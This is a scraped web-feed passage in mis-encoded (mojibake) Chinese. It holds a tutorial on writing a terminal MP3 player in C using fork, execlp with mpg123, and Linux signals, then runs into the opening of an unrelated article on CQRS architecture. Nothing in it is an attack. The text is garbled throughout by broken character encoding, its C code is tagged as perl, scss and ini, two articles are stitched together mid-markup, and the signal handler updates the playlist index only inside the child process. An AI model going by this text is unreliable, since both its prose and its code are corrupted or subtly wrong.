ä¸€æ¬¾å±äºè‡ªå·±çš„ç»ˆç«¯ MP3 æ’­æ”¾å™¨ï¼Ÿä¸ç”¨å¤æ‚çš„æ¡†æ¶ï¼Œä»…é  C è¯­è¨€ç»“åˆ Linux ç³»ç»Ÿè°ƒç”¨ï¼Œå°±èƒ½å®ç°å¾ªç¯æ’­æ”¾ã€å•æ›²å¾ªç¯ã€éšæœºæ’­æ”¾ã€æš‚åœ / ç»§ç»­ã€åˆ‡æ­Œç­‰æ ¸å¿ƒåŠŸèƒ½ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°±ä¸€æ­¥æ­¥æ‹†è§£è¿™æ¬¾æç®€åˆå®ç”¨çš„ç»ˆç«¯ MP3 æ’­æ”¾å™¨çš„å®ç°æ€è·¯ï¼Œè®©ä½ åœ¨æ•²ä»£ç çš„åŒæ—¶ï¼Œä¹Ÿèƒ½äº«å—éŸ³ä¹çš„ä¹è¶£ï¼</p>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒè®¾è®¡æ€è·¯ï¼šè¿›ç¨‹ + ä¿¡å·çš„å·§å¦™é…åˆ</h2>
<p>è¿™æ¬¾æ’­æ”¾å™¨çš„æ ¸å¿ƒé€»è¾‘å›´ç»•<strong>çˆ¶å­è¿›ç¨‹é€šä¿¡</strong>å’Œ<strong>ä¿¡å·å¤„ç†</strong>å±•å¼€ï¼Œè¿™ä¹Ÿæ˜¯ Linux ç³»ç»Ÿç¼–ç¨‹çš„ç»å…¸åº”ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>çˆ¶è¿›ç¨‹ï¼šè´Ÿè´£èœå•äº¤äº’ã€ç”¨æˆ·è¾“å…¥å¤„ç†ã€å­è¿›ç¨‹ç®¡ç†ï¼ˆåˆ›å»º / é”€æ¯ï¼‰ï¼›</li>
<li>å­è¿›ç¨‹ï¼šä¸“é—¨è´Ÿè´£è°ƒç”¨ç³»ç»ŸéŸ³é¢‘å·¥å…·ï¼ˆmpg123ï¼‰æ’­æ”¾éŸ³ä¹ï¼›</li>
<li>ä¿¡å·æœºåˆ¶ï¼šç›‘å¬å­è¿›ç¨‹é€€å‡ºä¿¡å·ï¼ˆSIGCHLDï¼‰å®ç°è‡ªåŠ¨ç»­æ’­ï¼Œé€šè¿‡ SIGSTOP/SIGCONT å®ç°æš‚åœ / ç»§ç»­ï¼Œé€šè¿‡ SIGKILL ç»ˆæ­¢æ’­æ”¾ã€‚</li>
</ul>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒåŠŸèƒ½æ‹†è§£ï¼šä»æ–‡ä»¶æ‰«æåˆ°éŸ³ä¹æ’­æ”¾</h2>
<h3 data-id="heading-2">1. ç¬¬ä¸€æ­¥ï¼šæ‰«æ MP3 æ–‡ä»¶ï¼Œæ„å»ºæ­Œå•</h3>
<p>è¦æ’­æ”¾éŸ³ä¹ï¼Œé¦–å…ˆå¾—æ‰¾åˆ°æœ¬åœ°çš„ MP3 æ–‡ä»¶ï¼æˆ‘ä»¬å€ŸåŠ© Linux çš„<code>glob</code>å‡½æ•°æ‰¹é‡æ‰«ææŒ‡å®šç›®å½•ä¸‹çš„<code>.mp3</code>æ–‡ä»¶ï¼Œè‡ªåŠ¨æ„å»ºæ­Œå•ï¼š</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-perl" lang="perl">void get_mp3_files() {
    <span class="hljs-regexp">//</span> åˆ‡æ¢åˆ°MP3æ–‡ä»¶ç›®å½•
    <span class="hljs-keyword">chdir</span>(<span class="hljs-string">"./4data/mp3/"</span>);
    <span class="hljs-regexp">//</span> åŒ¹é…æ‰€æœ‰.mp3æ–‡ä»¶
    <span class="hljs-keyword">glob</span>(<span class="hljs-string">"*.mp3"</span>, <span class="hljs-number">0</span>, NULL, &amp;glob_result);
    file_count = glob_result.gl_pathc;
    <span class="hljs-regexp">//</span> æ‰“å°æ­Œå•
    <span class="hljs-keyword">printf</span>(<span class="hljs-string">"\n======= æ­Œå• =======\n"</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; file_count; i++) {
        <span class="hljs-keyword">printf</span>(<span class="hljs-string">"%d\t%s\n"</span>, i, glob_result.gl_pathv[i]);
    }
}
</code></pre>
<p><code>glob</code>å‡½æ•°ä¼šè‡ªåŠ¨éå†ç›®å½•ï¼ŒæŠŠæ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è·¯å¾„å­˜å…¥<code>glob_result</code>ç»“æ„ä½“ï¼Œæˆ‘ä»¬åªéœ€é€šè¿‡<code>gl_pathc</code>è·å–æ–‡ä»¶æ•°é‡ï¼Œ<code>gl_pathv</code>è·å–æ–‡ä»¶è·¯å¾„æ•°ç»„å³å¯ã€‚</p>
<h3 data-id="heading-3">2. ç¬¬äºŒæ­¥ï¼šåˆ›å»ºå­è¿›ç¨‹æ’­æ”¾éŸ³ä¹</h3>
<p>Linux ä¸­ï¼Œçˆ¶è¿›ç¨‹é€šè¿‡<code>fork()</code>åˆ›å»ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹é€šè¿‡<code>execlp</code>è°ƒç”¨ç³»ç»Ÿè‡ªå¸¦çš„<code>mpg123</code>å·¥å…·ï¼ˆè½»é‡çº§éŸ³é¢‘æ’­æ”¾å™¨ï¼‰æ’­æ”¾éŸ³ä¹ï¼š</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹</span>
child_pid = <span class="hljs-built_in">fork</span>();
if (child_pid == <span class="hljs-number">0</span>) {
    <span class="hljs-comment">// å­è¿›ç¨‹ï¼šæ‰§è¡Œæ’­æ”¾å‘½ä»¤</span>
    <span class="hljs-built_in">execlp</span>("mpg123", "mpg123", "-q", filename, NULL);
    <span class="hljs-built_in">perror</span>("æ’­æ”¾å¤±è´¥");
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<ul>
<li><code>fork()</code>è¿”å›å€¼ï¼šçˆ¶è¿›ç¨‹ä¸­è¿”å›å­è¿›ç¨‹ PIDï¼Œå­è¿›ç¨‹ä¸­è¿”å› 0ï¼›</li>
<li><code>execlp("mpg123", ...)</code>ï¼šæ›¿æ¢å­è¿›ç¨‹çš„æ‰§è¡Œç¨‹åºä¸º<code>mpg123</code>ï¼Œ<code>-q</code>å‚æ•°è¡¨ç¤ºé™é»˜æ’­æ”¾ï¼Œé¿å…ç»ˆç«¯è¾“å‡ºå†—ä½™ä¿¡æ¯ã€‚</li>
</ul>
<h3 data-id="heading-4">3. ç¬¬ä¸‰æ­¥ï¼šä¿¡å·å¤„ç† â€”â€” å®ç°è‡ªåŠ¨ç»­æ’­ä¸æ’­æ”¾æ§åˆ¶</h3>
<h4 data-id="heading-5">ï¼ˆ1ï¼‰ç›‘å¬å­è¿›ç¨‹é€€å‡ºä¿¡å·ï¼ˆSIGCHLDï¼Œä¿¡å·å€¼ 17ï¼‰</h4>
<p>å½“ä¸€é¦–éŸ³ä¹æ’­æ”¾å®Œæ¯•ï¼Œå­è¿›ç¨‹ä¼šé€€å‡ºï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šå‘çˆ¶è¿›ç¨‹å‘é€ SIGCHLD ä¿¡å·ã€‚æˆ‘ä»¬é€šè¿‡ä¿¡å·å¤„ç†å‡½æ•°<code>signal_handler</code>æ•è·è¯¥ä¿¡å·ï¼Œæ ¹æ®ç”¨æˆ·é€‰æ‹©çš„æ’­æ”¾æ¨¡å¼è‡ªåŠ¨åˆ›å»ºæ–°å­è¿›ç¨‹æ’­æ”¾ä¸‹ä¸€é¦–ï¼š</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini">void signal_handler(int sig) {
    if (<span class="hljs-attr">sig</span> == <span class="hljs-number">17</span>) {
        pid_t <span class="hljs-attr">pid</span> = waitpid(-<span class="hljs-number">1</span>, &amp;status, WNOHANG)<span class="hljs-comment">;</span>
        if (pid &gt; 0 &amp;&amp; <span class="hljs-attr">pid</span> == child_pid) {
            // é‡æ–°åˆ›å»ºå­è¿›ç¨‹ç»­æ’­
            <span class="hljs-attr">child_pid</span> = fork()<span class="hljs-comment">;</span>
            if (<span class="hljs-attr">child_pid</span> == <span class="hljs-number">0</span>) {
                // å¾ªç¯æ’­æ”¾ï¼šä¸‹æ ‡è‡ªå¢ï¼Œè¶Šç•Œåˆ™é‡ç½®ä¸º0
                if (<span class="hljs-attr">ch</span> == <span class="hljs-number">1</span>) {
                    current_index++<span class="hljs-comment">;</span>
                    <span class="hljs-attr">current_index</span> = current_index &gt;= glob_result.gl_pathc ? <span class="hljs-number">0</span> : current_index<span class="hljs-comment">;</span>
                    play_music(glob_result.gl_pathv<span class="hljs-section">[current_index]</span>)<span class="hljs-comment">;</span>
                }
                // å•æ›²å¾ªç¯ï¼šæ’­æ”¾å½“å‰ä¸‹æ ‡æ–‡ä»¶
                else if (<span class="hljs-attr">ch</span> == <span class="hljs-number">2</span>) {
                    play_music(glob_result.gl_pathv<span class="hljs-section">[current_index]</span>)<span class="hljs-comment">;</span>
                }
                // éšæœºæ’­æ”¾ï¼šç”Ÿæˆä¸é‡å¤çš„éšæœºä¸‹æ ‡
                else if (<span class="hljs-attr">ch</span> == <span class="hljs-number">3</span>) {
                    int <span class="hljs-attr">random_index</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
                    if (glob_result.gl_pathc &gt; 1) {
                        do {
                            <span class="hljs-attr">random_index</span> = rand() % glob_result.gl_pathc<span class="hljs-comment">;</span>
                        } while (<span class="hljs-attr">random_index</span> == current_index)<span class="hljs-comment">;</span>
                    }
                    <span class="hljs-attr">current_index</span> = random_index<span class="hljs-comment">;</span>
                    play_music(glob_result.gl_pathv<span class="hljs-section">[random_index]</span>)<span class="hljs-comment">;</span>
                }
                exit(0)<span class="hljs-comment">;</span>
            }
        }
    }
}
</code></pre>
<ul>
<li><code>waitpid(-1, &amp;status, WNOHANG)</code>ï¼šéé˜»å¡ç­‰å¾…æ‰€æœ‰å­è¿›ç¨‹é€€å‡ºï¼Œé¿å…åƒµå°¸è¿›ç¨‹ï¼›</li>
<li>ä¸‰ç§æ’­æ”¾æ¨¡å¼ï¼šå¾ªç¯æ’­æ”¾ï¼ˆä¸‹æ ‡å¾ªç¯ï¼‰ã€å•æ›²å¾ªç¯ï¼ˆå›ºå®šä¸‹æ ‡ï¼‰ã€éšæœºæ’­æ”¾ï¼ˆç”Ÿæˆä¸é‡å¤éšæœºä¸‹æ ‡ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-6">ï¼ˆ2ï¼‰æš‚åœ / ç»§ç»­ï¼šSIGSTOPï¼ˆ19ï¼‰ä¸ SIGCONTï¼ˆ18ï¼‰</h4>
<p>é€šè¿‡å‘å­è¿›ç¨‹å‘é€ä¿¡å·å®ç°æ’­æ”¾æ§åˆ¶ï¼Œæ— éœ€é‡å¯å­è¿›ç¨‹ï¼š</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æš‚åœæ’­æ”¾ï¼šå‘é€SIGSTOPä¿¡å·</span>
<span class="hljs-built_in">kill</span>(child_pid, <span class="hljs-number">19</span>);
<span class="hljs-comment">// ç»§ç»­æ’­æ”¾ï¼šå‘é€SIGCONTä¿¡å·</span>
<span class="hljs-built_in">kill</span>(child_pid, <span class="hljs-number">18</span>);
</code></pre>
<h3 data-id="heading-7">4. ç¬¬å››æ­¥ï¼šäº¤äº’å¼èœå• â€”â€” å®ç°æ‰‹åŠ¨åˆ‡æ­Œ / é€€å‡º</h3>
<p>çˆ¶è¿›ç¨‹é€šè¿‡å¾ªç¯å±•ç¤ºèœå•ï¼Œæ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå¤„ç†ä¸Šä¸€æ›²ã€ä¸‹ä¸€æ›²ã€æš‚åœ / ç»§ç»­ã€é€€å‡ºç­‰æ“ä½œï¼š</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show_menu</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n======= MP3 æ’­æ”¾å™¨ =======\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å½“å‰æ’­æ”¾: %s\n"</span>, glob_result.gl_pathv[current_index]);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"1. ä¸Šä¸€æ›²\n2. æš‚åœ\n3. ç»§ç»­æ’­æ”¾\n4. ä¸‹ä¸€æ›²\n5. é€€å‡º\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"è¯·é€‰æ‹©æ“ä½œ: "</span>);
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">handle_choice</span><span class="hljs-params">(<span class="hljs-type">int</span> choice)</span> </span>{
    <span class="hljs-keyword">switch</span> (choice) {
        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// ä¸Šä¸€æ›²ï¼šä¸‹æ ‡é€’å‡ï¼Œè¶Šç•Œåˆ™è·³è½¬åˆ°æœ€åä¸€é¦–</span>
            current_index--;
            current_index = current_index &lt; <span class="hljs-number">0</span> ? glob_result.gl_pathc - <span class="hljs-number">1</span> : current_index;
            <span class="hljs-built_in">kill_child_process</span>(); <span class="hljs-comment">// æ€æ­»å½“å‰æ’­æ”¾è¿›ç¨‹</span>
            <span class="hljs-comment">// é‡æ–°åˆ›å»ºå­è¿›ç¨‹æ’­æ”¾æ–°æ­Œæ›²</span>
            child_pid = fork();
            <span class="hljs-keyword">if</span> (child_pid == <span class="hljs-number">0</span>) { <span class="hljs-built_in">play_music</span>(glob_result.gl_pathv[current_index]); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-comment">// ä¸‹ä¸€æ›²ï¼šé€»è¾‘åŒä¸Šï¼Œä¸‹æ ‡é€’å¢</span>
            <span class="hljs-comment">// ... çœç•¥ç›¸ä¼¼é€»è¾‘</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-comment">// é€€å‡ºï¼šé‡Šæ”¾èµ„æº+æ€æ­»å­è¿›ç¨‹</span>
            <span class="hljs-built_in">kill_child_process</span>();
            <span class="hljs-built_in">globfree</span>(&amp;glob_result); <span class="hljs-comment">// é‡Šæ”¾globç”³è¯·çš„å†…å­˜</span>
            <span class="hljs-keyword">break</span>;
    }
}
</code></pre>
<h2 data-id="heading-8">ä¸‰ã€è¿è¡Œæ•ˆæœï¼šç»ˆç«¯é‡Œçš„éŸ³ä¹ç››å®´</h2>
<ol>
<li>å¯åŠ¨ç¨‹åºï¼Œè‡ªåŠ¨æ‰«æ<code>./4data/mp3/</code>ç›®å½•ä¸‹çš„ MP3 æ–‡ä»¶ï¼Œæ‰“å°æ­Œå•ï¼›</li>
<li>é€‰æ‹©æ’­æ”¾æ¨¡å¼ï¼ˆå¾ªç¯ / å•æ›²å¾ªç¯ / éšæœºæ’­æ”¾ï¼‰ï¼›</li>
<li>ç»ˆç«¯å¼¹å‡ºæ“ä½œèœå•ï¼Œå¯éšæ—¶åˆ‡æ­Œã€æš‚åœ / ç»§ç»­ï¼Œä½“éªŒä¸æ»‘ï¼›</li>
<li>é€€å‡ºæ—¶è‡ªåŠ¨é‡Šæ”¾å†…å­˜ã€ç»ˆæ­¢å­è¿›ç¨‹ï¼Œæ— èµ„æºæ³„æ¼ã€‚</li>
</ol>
<h2 data-id="heading-9">å››ã€æŠ€æœ¯äº®ç‚¹ä¸æ‹“å±•æ–¹å‘</h2>
<h3 data-id="heading-10">ğŸŒŸ æ ¸å¿ƒäº®ç‚¹</h3>
<ol>
<li>çº¯ C è¯­è¨€ + Linux ç³»ç»Ÿè°ƒç”¨ï¼Œé›¶ç¬¬ä¸‰æ–¹æ¡†æ¶ï¼Œæè‡´è½»é‡åŒ–ï¼›</li>
<li>çˆ¶å­è¿›ç¨‹åˆ†ç¦»ï¼šæ’­æ”¾ä¸äº¤äº’è§£è€¦ï¼Œé¿å…æ“ä½œé˜»å¡æ’­æ”¾ï¼›</li>
<li>ä¿¡å·é©±åŠ¨ï¼šåˆ©ç”¨ Linux ä¿¡å·æœºåˆ¶å®ç°å¼‚æ­¥æ’­æ”¾æ§åˆ¶ï¼Œå“åº”åŠæ—¶ï¼›</li>
<li>å†…å­˜å®‰å…¨ï¼šé€šè¿‡<code>globfree</code>é‡Šæ”¾å†…å­˜ï¼Œ<code>waitpid</code>å›æ”¶å­è¿›ç¨‹ï¼Œæœç»åƒµå°¸è¿›ç¨‹å’Œå†…å­˜æ³„æ¼ã€‚</li>
</ol>
<h3 data-id="heading-11">ğŸš€ æ‹“å±•æ–¹å‘</h3>
<ol>
<li>æ”¯æŒè‡ªå®šä¹‰ MP3 ç›®å½•ï¼šé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šæ‰«æè·¯å¾„ï¼›</li>
<li>éŸ³é‡è°ƒèŠ‚ï¼šè°ƒç”¨<code>mpg123</code>çš„éŸ³é‡å‚æ•°ï¼ˆ<code>-v</code>ï¼‰æˆ–ç»“åˆ<code>alsa-utils</code>å·¥å…·ï¼›</li>
<li>æ­Œè¯åŒæ­¥ï¼šè§£æ lrc æ–‡ä»¶ï¼Œé€šè¿‡å®šæ—¶å™¨åŒæ­¥æ‰“å°æ­Œè¯ï¼›</li>
<li>åå°æ’­æ”¾ï¼šç»“åˆ<code>setsid</code>åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ï¼Œè„±ç¦»ç»ˆç«¯è¿è¡Œã€‚</li>
</ol>
<h2 data-id="heading-12">äº”ã€æ€»ç»“</h2>
<p>è¿™æ¬¾ç»ˆç«¯ MP3 æ’­æ”¾å™¨çœ‹ä¼¼ç®€å•ï¼Œå´æµ“ç¼©äº† Linux ç³»ç»Ÿç¼–ç¨‹çš„æ ¸å¿ƒæ€æƒ³ï¼šè¿›ç¨‹ç®¡ç†ã€ä¿¡å·å¤„ç†ã€æ–‡ä»¶æ“ä½œã€‚ä»æ‰«ææ–‡ä»¶åˆ°åˆ›å»ºè¿›ç¨‹ï¼Œä»ä¿¡å·ç›‘å¬åˆ°åº•å±‚è°ƒç”¨ï¼Œæ¯ä¸€è¡Œä»£ç éƒ½åœ¨å’Œæ“ä½œç³»ç»Ÿ â€œå¯¹è¯â€ã€‚</p>
<p>é€šè¿‡äº²æ‰‹å®ç°è¿™ä¸ªå°é¡¹ç›®ï¼Œä½ ä¸ä»…èƒ½å·©å›º C è¯­è¨€åŸºç¡€ï¼Œæ›´èƒ½æ·±å…¥ç†è§£ Linux çš„è¿›ç¨‹æ¨¡å‹å’Œä¿¡å·æœºåˆ¶ â€”â€” è¿™æ¯”å•çº¯èƒŒç†è®ºè¦é«˜æ•ˆå¾—å¤šã€‚å½“ç»ˆç«¯é‡Œå“èµ·ä½ äº²æ‰‹æ’­æ”¾çš„éŸ³ä¹æ—¶ï¼Œé‚£ç§æŒæ§ç³»ç»Ÿçš„æˆå°±æ„Ÿï¼Œæ˜¯ä»»ä½•ç°æˆå·¥å…·éƒ½æ— æ³•æ›¿ä»£çš„ã€‚</p>
<p>ç°åœ¨ï¼Œä¸å¦¨æŠŠä»£ç æ‹‰ä¸‹æ¥ï¼Œæ”¹ä¸€æ”¹ç›®å½•è·¯å¾„ï¼ŒåŠ å‡ ä¸ªè‡ªå·±å–œæ¬¢çš„åŠŸèƒ½ï¼Œè®©è¿™æ¬¾æ’­æ”¾å™¨çœŸæ­£å±äºä½ ã€‚æ¯•ç«Ÿï¼Œåœ¨ Linux çš„ä¸–ç•Œé‡Œï¼Œæœ€å¥½çš„å·¥å…·æ°¸è¿œæ˜¯è‡ªå·±å†™çš„é‚£ä¸€ä¸ªï½</p>
<blockquote>
<p>å®Œæ•´ä»£ç å·²æ‹†åˆ†å±•ç¤ºï¼Œå¯ç›´æ¥æ•´åˆç¼–è¯‘ï¼ˆç¼–è¯‘å‘½ä»¤ï¼š<code>gcc *.c -o mp3_player -lmpg123</code>ï¼‰ï¼Œéœ€æå‰å®‰è£…<code>mpg123</code>ï¼ˆ<code>apt install mpg123</code>ï¼‰ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CQRS æ¶æ„å¦‚ä½•è®©ç³»ç»Ÿâ€œå†™å¾—ç¨³ã€æŸ¥å¾—å¿«â€]]></title>    <link>https://juejin.cn/post/7602551091516096521</link>    <guid>https://juejin.cn/post/7602551091516096521</guid>    <pubDate>2026-02-04T02:49:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602551091516096521" data-draft-id="7602551091516080137" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CQRS æ¶æ„å¦‚ä½•è®©ç³»ç»Ÿâ€œå†™å¾—ç¨³ã€æŸ¥å¾—å¿«â€"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-02-04T02:49:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°é£Coding"/> <meta itemprop="url" content="https://juejin.cn/user/954816145155181"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CQRS æ¶æ„å¦‚ä½•è®©ç³»ç»Ÿâ€œå†™å¾—ç¨³ã€æŸ¥å¾—å¿«â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/954816145155181/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°é£Coding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:49:03.000Z" title="Wed Feb 04 2026 02:49:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„å›°å¢ƒï¼Ÿ</p>
<ul>
<li>è®¢å•è¡¨å­—æ®µè¶Šæ¥è¶Šå¤šï¼Œæ—¢è¦æ”¯æŒä¸‹å•æ ¡éªŒï¼Œåˆè¦æ”¯æ’‘è¿è¥åå°çš„ 20 ç§ç­›é€‰æ¡ä»¶ï¼›</li>
<li>é«˜å¹¶å‘ä¸‹å•æ—¶ï¼Œå¤æ‚çš„æŠ¥è¡¨æŸ¥è¯¢æ‹–æ…¢æ•´ä¸ªæ•°æ®åº“ï¼›</li>
<li>æƒ³ç»™ç”¨æˆ·åŠ ä¸ªâ€œæŒ‰å•†å“åæœè®¢å•â€åŠŸèƒ½ï¼Œå´è¦æ”¹æ ¸å¿ƒäº¤æ˜“æ¨¡å‹ï¼Œé£é™©æé«˜â€¦â€¦</li>
</ul>
<p>è¿™äº›é—®é¢˜çš„èƒŒåï¼Œå¾€å¾€æ˜¯å› ä¸ºæˆ‘ä»¬<strong>ç”¨åŒä¸€ä¸ªæ•°æ®æ¨¡å‹åŒæ—¶æ‰¿æ‹…â€œå†™â€å’Œâ€œè¯»â€çš„èŒè´£</strong>ã€‚è€Œè§£å†³ä¹‹é“ï¼Œæ­£æ˜¯æœ¬æ–‡è¦è®²çš„â€”â€”<strong>CQRSï¼ˆCommand Query Responsibility Segregationï¼‰</strong> ã€‚</p>
